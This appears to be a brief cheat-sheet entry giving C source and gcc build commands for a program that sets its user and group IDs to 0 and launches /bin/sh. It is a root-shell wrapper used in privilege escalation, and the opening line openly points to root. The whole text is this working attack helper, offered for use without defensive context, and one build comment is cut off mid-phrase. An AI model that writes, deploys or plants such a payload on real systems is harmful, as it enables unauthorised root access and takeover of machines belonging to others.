Sets the user ID to whatever you want (but you know you want 0 for root)

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
    setuid(0); setgid(0); system("/bin/sh");
}
```

Compile with

```bash
# 32-bit, requires gcc-multilib
gcc -m32 setuid.c -o setuid
# 64-bit, requires 
gcc setuid.c -o setuid
```

